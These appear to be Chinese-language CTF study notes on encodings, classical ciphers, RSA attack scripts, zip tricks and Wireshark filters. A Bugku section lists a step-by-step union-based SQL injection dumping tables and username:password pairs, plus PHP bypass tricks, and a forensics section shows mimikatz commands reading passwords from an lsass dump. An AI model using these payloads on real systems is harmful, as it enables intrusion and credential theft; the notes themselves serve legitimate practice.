# 0x2 Crypto
[TOC]
# 加解密

## 常见Flag格式, 包括大小写
flag{..}

key{..}

ctf{..}
## 解题思路

1. 常见的加密方式
2. 明显闪烁，morse密码短是1帧，长是3帧
2. 汉字出头的笔画。


## 技巧
有hex值，都超过128, 试着-128解题。

有些多次线性的加密，都和1次线性一样，循环暴破试试。

2 >> 256, a=a^ 0x10000223L 这种一样，表示一个循环。用自带的加密算法暴破。

试着将结果继续加密循环。

变异凯撒： 看秘文每位的ascii码, 看相临的差

Windows系统密码: MD5
## 不认识的文件

直接 linux下 file `filename`
## 密码学
### ASCII 
   
    数字
    48..0
    65...A
    97...a
    123...{
    125...}
### base64

长度为4的倍数,最多补3个=

3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式

64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)

Base64,32,16 混合。

[base64隐写](https://www.jianshu.com/p/48fe4dd3e5ce)

### base32
大写 + 数字
### base58
  
    ❀ Base58 编码表：123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ ❀


### base 加密类
    密文:uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz

    泄露的密文:pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=
    泄露的明文:ashlkj!@sj1223%^&*Sd4564sd879s5d12f231a46qwjkd12J;DJjl;LjL;KJ8729128713

对泄露的密文尝试base64解码，发现失败，对泄露的明文进行base64加密，发现正好和泄露的密文的长度相等。。。

    pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=
    YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=

于是可以猜测是换了码表 利用我们已知明文和对应密文来推算替换的码表，

我们将已知的明文进行base64加密，然后将加密的结果和密文进行一个对比：

```python
a= 'pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF='
b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM='

list_a=[]
for i in a:
    list_a.append(i)

list_b=[]
for i in b:
    list_b.append(i)

nvs = zip(list_a,list_b)

def deleteDuplicate(li):
    temp_list = list(set([str(i) for i in li]))
    li=[eval(i) for i in temp_list]
    return li

print (deleteDuplicate(nvs))
```

得到了如下的对应关系：

>[('d', 'x'), ('j', 'N'), ('8', 's'), ('B', 'i'), ('k', 'O'), ('T', 'X'), ('H', 'B'), ('F', 'M'), ('9', 't'), ('o', 'T'), ('M', 'o'), ('J', 'G'), ('W', 'q'), ('A', 'h'), ('p', 'Y'), ('Q', 'U'), ('q', 'c'), ('r', 'g'), ('u', 'Z'), ('v', 'a'), ('i', 'I'), ('D', 'k'), ('7', 'r'), ('N', 'p'), ('/', 'F'), ('K', 'l'), ('2', 'D'), ('e', 'y'), ('=', '='), ('g', '0'), ('S', 'W'), ('n', 'S'), ('Z', 'L'), ('w', 'b'), ('O', '3'), ('P', '4'), ('C', 'j'), ('3', 'd'), ('m', 'Q'), ('f', 'z'), ('t', '2'), ('L', 'm'), ('+', 'E')]

然后将密文中的字符进行替换， 对照发现还有几个字母的相对应的密文是未知的，分别是E I X s G z

然后根据，flag是uuid的性质，推测出来几位，然后进行手工验证，得到了flag

感觉也是运气比较好，尝试了几次就出来了

flag{1e3a2de5-1c02-4f4f-9b2e-a4afabdf01e6}

### 仿射密码
加密 e(x) = a(x) + b (mod m)

解密 d(x) = a<sup>-1</sup>(x - b) (mod m) , a<sup>-1</sup>为a的逆元

字母转为0-25进行计算。

### A开头常见Base85

Base85

base85 也称为Ascii85，是Paul E. Rutter为btoa实用程序开发的一种二进制文本编码形式。通过使用五个ASCII字符来表示四个字节的二进制数据（使编码量1 / 4比原来大，假设每ASCII字符8个比特），它比更有效UUENCODE或Base64的，它使用四个字符来表示三个字节的数据（1 / 3的增加，假设每ASCII字符8个比特）。

用途是Adobe的PostScript和Portable Document Format文件格式，以及Git使用的二进制文件的补丁编码。

与Base64一样，Base85编码的目标是对二进制数据可打印的ASCII字符进行编码。但是它使用了更大的字符集，因此效率更高一些。具体来说，它可以用5个字符编码4个字节（32位）。

### 培根密码 bacon
bacoN is one of aMerICa'S sWEethEartS. it's A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE

小写为A，大写为B。转换后放CTF Cracktool 解一下。

### 凯撒密码
一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。
----只处理字母
lrua{1uy3yj9l-yw9u-48j2-uuj8-36h03706y7u7}
flag{....}

l 第12个字母 ->f     左6          
r 18->l             左6
u 21->a             右6
a  1->g             右6
此题增加了奇偶性

### MD5

检查长度32位。
### RSA
两个大素数，p和q,为了获得最大程度的安全性，两数的长度一样。

乘积n=p*q;

随机取加密密钥e,使得e 和（p-1)（q-1) 互素，最后采用扩展欧几里得算法计算解密密钥d，

d=e^-1 mod (p-1)(q-1)

d和n也是互素。e和n是公开密钥，d是私人密钥。

欧几里得算法: 最大公约数

#### 解题类型

[已知因子中的高位,分解p](https://mp.weixin.qq.com/s/hkR5eBLa4Qdh8BqAAh58Pg)

#### 下载 rsactftool 常用的基本都能解

##### install
```shell
git clone https://github.com/Ganapati/RsaCtfTool.git
sudo apt-get install libgmp3-dev libmpc-dev
pip3 install -r "requirements.txt"
python3 RsaCtfTool.py
```
##### usage
    python3 RsaCtfTool.py [-h] [--publickey PUBLICKEY] [--output OUTPUT]
                         [--timeout TIMEOUT] [--createpub] [--dumpkey] [--ext]
                         [--uncipherfile UNCIPHERFILE] [--uncipher UNCIPHER]
                         [--verbosity {CRITICAL,ERROR,WARNING,DEBUG,INFO}]
                         [--private] [--ecmdigits ECMDIGITS] [-n N] [-p P] [-q Q]
                         [-e E] [--key KEY] [--password PASSWORD]
                         [--attack {siqs,comfact_cn,cube_root,pollard_p_1,mersenne_primes,smallfraction,partial_q,qicheng,factordb,londahl,smallq,ecm2,wiener,primefac,noveltyprimes,ecm,pastctfprimes,fermat,boneh_durfee,commonfactors,same_n_huge_e,hastads,all}]

python3 RsaCtfTool.py  -n 123 -e 3 --uncipherfile test.key

python3 RsaCtfTool.py --createpub -n 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 -e 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 > test.pem

python3 RsaCtfTool.py --publickey test.pem --private > test.key

python RsaCtfTool.py --key test.key --dumpkey

#### yafu

yafu-x64 factor(123123)

数过长时使用文件, 一定最后要换行

yafu-x64 "factor(@)" -batchfile pcat.txt
#### RSA Tools 使用
注意e 是16进制。其他在右上角选Number base， 16进制还是10进制。

1. n,e 求 pq， 填好点Factor N => Calc D.

e 通常为 65537(0x10001)

* 常用方法

RsaCtfTool.py --dumpkey --key pubkey.pem

python3 RsaCtfTool.py --key pubkey.pem --uncipherfile ../flag.enc

python3 ./RsaCtfTool.py --publickey ../public.pem --uncipherfile ./flag.enc

#### RSA题目类型及攻击方法

##### n 分解为 pq
yafu-x64.exe factor(1个10进制数)

一定要转为10进制的数
##### 已知e,p,q求d

    import gmpy2
    d = gmpy2.invert(e, (p-1)*(q-1))

##### 已知e,d,n求p,q

    import random

    def gcd(a, b):
        if a < b:
            a, b = b, a
        while b != 0:
            temp = a % b
            a = b
            b = temp
        return a

    def getpq(n, e, d):
        p = 1
        q = 1
        while p == 1 and q == 1:
            k = d * e - 1
            g = random.randint(0, n)
            while p == 1 and q == 1 and k % 2 == 0:
                k /= 2
                y = pow(g, k, n)
                if y != 1 and gcd(y - 1, n) > 1:
                    p = gcd(y - 1, n)
                    q = n / p
            return p, q

    n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab
    e = 0x10001
    d = 0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881
    p, q = getpq(n, e, d)
    print "p: " + hex(p)
    print "q: " + hex(q)

#### radmin 加密  e=2

    p = 319576316814478949870590164193048041239
    q = 275127860351348928173285174381581152299
    N = 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
    e = 65537
    d = 67595638816573989554792254030140009889606004728909368108258780298415699743563

    import gmpy2
    # radin 加密 , e=2

    with open('flag.enc', 'rb') as f:
        cipher = f.read().hex()
        cipher = int(cipher, 16)
        print(cipher)

    yp = gmpy2.invert(p, q)
    yq = gmpy2.invert(q, p)

    # 计算mp和mq
    mp = pow(cipher, (p + 1) // 4, p)
    mq = pow(cipher, (q + 1) // 4, q)

    # 计算a,b,c,d
    a = (yp * p * mq + yq * q * mp) % N
    b = N - int(a)
    c = (yp * p * mq - yq * q * mp) % N
    d = N - int(c)

    for i in (a, b, c, d):
        s = '%x' % i
        if len(s) % 2 != 0:
            s = '0' + s
        print (s)
        print(bytearray.fromhex(s).decode('Latin1'))
        # print(codecs.decode(s, "hex"))
        # print (bytearray.fromhex(s).decode())

#### rsa 共模攻击

    from Crypto.Util.number import long_to_bytes, bytes_to_long
    from gmpy2 import gcdext,invert
    n=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929
    e1=17
    e2=65537
    f1=open(r'flag.enc1','rb')
    f2=open(r'flag.enc2','rb')
    c1=bytes_to_long(f1.read())
    c2=bytes_to_long(f2.read())
    (tmp,s1,s2)=gcdext(e1,e2)
    if s1<0:
        s1=-s1
        c1=invert(c1,n)
    else:
        s2=-s2
        c2=invert(c2,n)
    m=(pow(c1,s1,n)*pow(c2,s2,n))%n
    print(long_to_bytes(m))

#### openssl pem文件
分解公钥
  
    openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem

使用私钥解密

  openssl rsautl -decrypt -inkey pkey -in ../mediumRSA/flag.enc -out out.txt


#### 低解密指数攻击

#### 共模攻击

#### 低解密指数广播攻击

### Quoted-printable
可打印字符引用编码

明文：=B4=F0=B0=B8=CA=C7=A3=BA=A3=A1=40=A3=A1=40=23=A3=A4=25=A1=AD=A1=AD

### XXencode编码
Cat编码后是Eq3o
但实际结果为1Eq3o，因为Cat为3个字节，序号是3对应的字符为1。

### jother 编码
类似这种  ([][(![]+[]

### 幂数加密

`8842101220480224404014224202480122`， 0分隔，各段相加，对应字母表位置或者ascii码

- | - |  - |  - |  - |  - |  - |  - |  -
- | :-: |  :-: |  :-: |  :-: |  :-: |  :-: |  :-: |  :-:
0拆分 | '88421' |  '122' |  '48' |  '2244' |  '4' |  '142242' |  '248' |  '122'
相加 | 23 |  5 |  12 |  12 |  4 |  15 |  14 |  5
字母 | W | E | L | L | D | O | N | E

### 栅栏密码 fencecode


```
①把将要传递的信息中的字母交替排成上下两行。
②再将下面一行字母排在上面一行的后边，从而形成一段密码。
③例如：
明文：THE LONGEST DAY MUST HAVE AN END
加密：
1、把将要传递的信息中的字母交替排成上下两行。
T E O G S D Y U T A E N N
H L N E T A M S H V A E D
2、 密文：
将下面一行字母排在上面一行的后边。
TEOGSDYUTAENN HLNETAMSHVAED
解密：
先将密文分为两行
T E O G S D Y U T A E N N
H L N E T A M S H V A E D
再按上下上下的顺序组合成一句话
明文：THE LONGEST DAY MUST HAVE AN END
```

[Railfence - W型加密](http://rumkin.com/tools/cipher/railfence.php)

原文  WAFFLES FOR BREAKFAST, 分3栏
```
W   L   F   B   K   T
 A F E * O * R A F S
  F   S   R   E   A
```
W   L   F   B   K   T
0123456789012345678901234567890
 A F E * O * R A F S
0123456789012345678901234567890
  F   S   R   E   A
0123456789012345678901234567890
r1  1,5,9,13  +4
r2  2,4,6,8  +2
r3  

### 曼彻斯特编码

http://shaobaobaoer.cn/archives/396/曼彻斯特编码

## 压缩包加密破解

[Link](https://www.anquanke.com/post/id/86211)

binwalk 查看有没有压缩包，如果有

binwalk -e filename

### zip加密暴力破解、字典破解

### 伪加密

可使用 ZipCenOp.jar 处理后尝试解压

zip文件分析:

    压缩源文件数据区： 
    50 4B 03 04：这是头文件标记 
    14 00：解压文件所需 pkware 版本 
    00 00：全局方式位标记（有无加密） 
    08 00：压缩方式 
    07 76：最后修改文件时间 
    F2 48：最后修改文件日期 
    …… 
    压缩源文件目录区： 
    50 4B 01 02：目录中文件文件头标记(0x02014b50) 
    1F 00：压缩使用的 pkware 版本 
    14 00：解压文件所需 pkware 版本 
    00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 
    08 00：压缩方式 
    07 76：最后修改文件时间 
    F2 48：最后修改文件日期 
### word文档伪加密

### 爆破
advanced zip password recovery -- AZPR

改成zip解压找找

### zlib 加密

读取指定位置的内容

    from zlib import decompress
    data = open('c1.png', 'rb').read()[0xF4289:]
    decompress(data)

### CRC32 明文攻击--已有1文件a和1加密压缩包b
b中包含a, 需要用相同的压缩方式压缩

https://www.freebuf.com/column/201834.html

## CTF 取证分析 Wireshark等
看最近几天的日志。看这几天的异常。

    可疑记录文件
    robots.txt
    shell.php 
    可疑状态码  同文件时，400变 200
    跨目录访问


### 未整理

存在unicode字符时，使用kali过滤后转码。

关注 http协议和tcp协议

示例，Chopper 统计-对话，看大文件，11m不是。10mb的是。

右击-追踪流-tcp流，显示保存为->原始数据，左下角改方向A->B，保存成rar.

    密码JJBoom , 解压 gif 隐写？拉入Winhex，MDMP开头，dump的文件头。改为1.dmp。
    ：：lsass.exe dump 后可以读出当前用户的密码。
    mimikatz.exe 读取dmp文件。

    sekurlsa::minidump 1.dmp # 读取dmp文件
    sekurlsa::logonPasswords full #读取密码
### 显示时间 
视图-时间显示格式-日期和时间 (Ctrl+Alt+1)

### 检查协议 
1. 首先，wireshark统计->会话(Conversation), 从 192.168.0.9 -> 99 流量最大。

2. 统计 -> 协议分级 ， 有icmp 和 tcp

如果是扫描，就是 ping 走的 icmp

TCP数据量大，ICMP数据量少容易分析。
### 解题思路
1. 根据题目， 过滤协议， 右键-TCP流-追踪


### 过滤 Filter

按 `Ctrl+/` 进入过滤

```
http.request.method in {"HEAD" "GET"}
http.request.method=="GET"
http.request.full_uri  contains skyflag_is_here2333
http.file_data contains Hello
//根据返回结果，text data包含Hello，看对应的request frame 编号
http.host contains weixin
http.response.code==302
//过滤http响应状态码为302的数据包
http.response==1
//过滤所有的http响应包
http.content_type == “text/html”
http.content_length == 279
http.content_length_header == “279″
//根据content_length的数值过滤
```

过滤从192.168.0.9发往192.168.0.99并且是icmp协议

    ip.dst==192.168.0.99 && icmp
    ip.addr==192.168.0.99 && icmp
    ip.addr==192.168.0.9 && ip.addr==192.168.0.99 and icmp
    ip.dst==192.168.0.99 && icmp && !(icmp >= "Destination unreachable")

（1）对源地址为192.168.0.1的包的过滤，即抓取源地址满足要求的包。

         表达式为：ip.src == 192.168.0.1

（2）对目的地址为192.168.0.1的包的过滤，即抓取目的地址满足要求的包。

         表达式为：ip.dst == 192.168.0.1

（4）要排除以上的数据包，我们只需要将其用括号囊括，然后使用 "!" 即可。

         表达式为：!(表达式)
 
二、针对协议的过滤
（1）仅仅需要捕获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可。

                表达式为：http

（2）需要捕获多种协议的数据包，也只需对协议进行逻辑组合即可。

         表达式为：http or telnet （多种协议加上逻辑符号的组合即可）

（3）排除某种协议的数据包

         表达式为：not arp      !tcp
 
三、针对端口的过滤（视协议而定）

（1）捕获某一端口的数据包

         表达式为：tcp.port == 80

（2）捕获多端口的数据包，可以使用and来连接，下面是捕获高端口的表达式

         表达式为：udp.port >= 2048
 
四、针对长度和内容的过滤

（1）针对长度的过虑（这里的长度指定的是数据段的长度）

         表达式为：udp.length < 30   http.content_length <=20

（2）针对数据包内容的过滤

    表达式为：http.request.uri matches "vipscu"  （匹配http请求中含有vipscu字段的请求信息）

Show only SMTP (port 25) and ICMP traffic:

    tcp.port eq 25 or icmp
Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
    
    ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

TCP buffer full -- Source is instructing Destination to stop sending data

    tcp.window_size == 0 && tcp.flags.reset != 1

Filter on Windows -- Filter out noise, while watching Windows Client - DC exchanges

    smb || nbns || dcerpc || nbss || dns


To match IP addresses ending in 255 in a block of subnets (172.16 to 172.31):

    string(ip.dst) matches "^172\.(1[6-9]|2[0-9]|3[0-1])\..{1,3}\.255"

## bugku练习

    php 传入数字，做非数字判断： 传入1xxxx ，即1开头的字符串
    $$args, 可变变量 = $($args) 传入GLOBALS，显示全部变量得到flag
    没提示时扫后台，无提示密码暴破。
    题目需要我们传入两个值，分别为key1和key2，且key1和key2的值不能相同但md5值相同，
      通过传入值不相同的数组可以实现。但是有一点需要注意,语句str_replace('key',' ',$str)会将key替换为空格，
      这一点我们可以通过双写key对其进行绕过，最终的payload:
    常见SQL注入
       Firefox hackbar, post 测试
      id=1 正常
      id=1' 空
      id=1' # 加#注释又正常了
      id=1' order by 1 #
      id=1' order by 2 #
      id=1' order by 3 #
      id=1' order by 4 # 测出共4列
      id=-1' union select 1,database(), user(), version()#  得到数据库名字skctf_flag
      id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()), user(), version() # 得到表名fl4g,sc
      id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# 得到表名fl4g,sc --和上行同效果
      id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# 得到字段 skctf_flag , 将敏感的表进行16进制编码
      id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'# 得到字段 skctf_flag 或者用''括号上表名
      id=-1' union select 1,2,3,skctf_flag from fl4g# 查数据
      

      爆所有数据名 
      select group_concat(SCHEMA_NAME) from information_schema.schemata 
      得到当前库的所有表 
      select group_concat(table_name) from information_schema.tables where table_schema=database() # 得到当前库的所有表
      得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572 
      select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572 
      得到字段具体的值 
      select group_concat(username,0x3a,password) from adminuser
    # TODO
    RSA 练习1个
    burpsuit 暴破后暂停？


## Wiki
### 数学

恒等于号 A≡B。读作：A恒等于B

mod 同余， 左右都取余。
逆元 2 * 3 % 5 = 1，那么3就是2关于5的逆元，或者说2和3关于5互为逆元

>设c是b的逆元，则有b*c≡1(mod m)；

>推论：(a/b)mod m = (a/b)*1mod m = (a/b)bc mod m=a*c(mod m); 即a/b的模等于a * (b的逆元)的模；

>这个推论也就说明了为什么要引入逆元；

取模操作是保证参数和生成结果不会扩大到数域以外, 就可以随便在数域里面折腾了
### 逆元的计算方法

https://blog.csdn.net/qq_41431457/article/details/89813606

### Base64 Wiki
[参考](https://www.liaoxuefeng.com/wiki/1016959663602400/1017684507717184)

URL中的“/”和“+”字符变为形如“%XX”的形式，所以用Base64编码。

Base64要求把每三个8Bit的字节转换为四个6Bit的字节（`3*8 = 4*6 = 24`）然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。

索引|对应字符|索引|对应字符|索引|对应字符|索引|对应字符
---|---|---|---|---|---|---|---
0|A|17|R|34|i|51|z
1|B|18|S|35|j|52|0
2|C|19|T|36|k|53|1
3|D|20|U|37|l|54|2
4|E|21|V|38|m|55|3
5|F|22|W|39|n|56|4
6|G|23|X|40|o|57|5
7|H|24|Y|41|p|58|6
8|I|25|Z|42|q|59|7
9|J|26|a|43|r|60|8
10|K|27|b|44|s|61|9
11|L|28|c|45|t|62|+
12|M|29|d|46|u|63|/
13|N|30|e|47|v||
14|O|31|f|48|w||
15|P|32|g|49|x||
16|Q|33|h|50|y||

示例 123 转 base64
  
    # [49, 50, 51]
    # ['00110001', '00110010', '00110011']
    # ['00001100', '00010011', '00001000', '00110011']
    # [12, 19, 8, 51]

示例 1 转换 base64

    ['00110001']
    ['00001100 00010000'] 不足4位时, 前面补00, 后面补0000 
    [12, 16]

### Phenom Wiki

有密钥，明文，密文。

Th|Th|Th|Th|Th|Th|Th|Th
-|-|-|-|-|-|-|-
A|1000001|B|1000010|C|1000011|D|1000100
E|1000101|F|1000110|G|1000111|H|1001000
I|1001001|J|1001010|K|1001011|L|1001100
M|1001101|N|1001110|O|1001111|P|1010000
Q|1010001|R|1010010|S|1010011|T|1010100
U|1010101|V|1010110|W|1010111|X|1011000
Y|1011001|Z|1011010|

密钥根据码表转码。 密文转成二进制。两者异或

得到密文。
### gmpy2

https://blog.csdn.net/Cony_14/article/details/103088245

```python
# 问题描述，求d
n=pq
phi =(p-1)(q-1)
ed=1 mod phi
```

```python
# 常用的库
import libnum
libnum.n2s(n)数字转字符串 libnum.s2n(s)
gmpy2.mpz(n)初始化一个大整数
n=invert(m,phi)求mod phi的逆元, 简单理解 m + n (mod phi) == 0
pow(m,e,n)求c^d mod n
gmpy2.is_prime(n) 素性检测
gmpy2.gcd(a,b)  欧几里得算法，最大公约数
gmpy2.gcdext(a,b)  扩展欧几里得算法
gmpy2.iroot(x,n) x开n次根
```

### sagecell

解方程

三元一次
```python
var('x y z')
solve([3*x-y+z==185,
2*x+3*y-z==321,
x+y+z==173], [x,y,z])
```

一元二次
```python
var('x')
# x*x+x-7943722218936282=0
f(x)=x*x+x-7943722218936282
f.roots()
```
